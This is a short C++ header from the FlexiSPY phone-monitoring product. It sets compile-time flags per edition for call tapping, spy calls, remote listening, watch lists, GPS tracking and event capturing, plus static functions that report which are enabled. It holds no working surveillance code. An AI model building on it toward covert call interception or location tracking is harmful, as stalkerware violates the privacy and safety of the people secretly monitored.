#ifndef __FEATURE_H__
#define __FEATURE_H__

#if defined(__APP_FXS_PROX) //FlexiSPY PRO
	//FlexiSPY PRO-X
	#define FEATURE_EVENT_CAPTURING
	#define FEATURE_GPS
	#define FEATURE_SPY_CALL
	#define FEATURE_CALL_TAPPING
	#define FEATURE_WATCH_LIST
	#define FEATURE_REMOTE_LISTINING
#elif defined __APP_FXS_PRO
	//FlexiSPY PRO
	#define FEATURE_SPY_CALL
	#define FEATURE_EVENT_CAPTURING
	#define FEATURE_REMOTE_LISTINING	
#elif defined __APP_FXS_LIGHT
	//empty here
	#define FEATURE_EVENT_CAPTURING
#endif

class Feature
	{
public:
	/*
	* @return ETrue if the application supports either call tapping or remote listening
	*/
	static TBool SpyCall()
		{
		#if (defined(FEATURE_CALL_TAPPING) || defined(FEATURE_REMOTE_LISTINING))
		return ETrue;
		#else
		return EFalse;
		#endif
		}
	static TBool WatchList()
		{
		#ifdef FEATURE_WATCH_LIST
		return ETrue;
		#else
		return EFalse;
		#endif
		}
	static TBool RemoteListening()
		{
		#ifdef FEATURE_REMOTE_LISTINING
		return ETrue;
		#else
		return EFalse;
		#endif
		}
	static TBool CallTapping()
		{
		#ifdef FEATURE_CALL_TAPPING
		return ETrue;
		#else
		return EFalse;
		#endif
		}
	static TBool GPS()
		{
		#ifdef FEATURE_GPS
		return ETrue;
		#else
		return EFalse;
		#endif
		}
	static TBool EventCapturing()
		{
		#ifdef FEATURE_EVENT_CAPTURING
		return ETrue;
		#else
		return EFalse;
		#endif
		}						
	};
	
#endif // end of file
